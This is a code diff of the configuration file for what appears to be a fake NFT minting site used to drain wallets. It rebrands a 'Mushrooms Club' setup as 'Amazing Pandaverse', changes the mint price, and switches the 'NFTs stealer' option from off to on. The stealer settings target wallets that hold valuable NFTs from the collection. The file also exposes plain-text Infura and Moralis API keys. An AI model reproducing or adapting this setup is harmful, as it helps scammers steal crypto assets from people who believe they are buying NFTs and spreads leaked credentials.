@@ -3,8 +3,8 @@ const infuraId = "6d233bb428724900aa1d6ac6bba531b1"     // Infuria ID | https://
 const moralisApi = "8lLcZsKmH7Scwxzqp7O3REOhP8nGAMh9CjJTjKwVMQzYJ16fKNs9rClIsQOq0kyx"    // x-api-key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Mushrooms Club",
-    title: "Mushrooms Club", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    name: "Amazing Pandaverse",
+    title: "Amazing Pandaverse", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "04/01/2022",
     socialMedia: {
         discord: "https://discord.gg/mushroomsclubnft",
@@ -22,15 +22,15 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.007,         // Price per NFT.
-    totalSupply: 888,   // Total supply of NFTs.
+    price: 0.089,         // Price per NFT.
+    totalSupply: 100,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 10,        // Max units to buy.
     askMintLoop: false,  // If true, when the user closes the metamask popup, it reopens automatically.
 }
 
 const nftsInfo = {
-    active: false,   // Active (true) or not (false) NFTs stealer.
+    active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
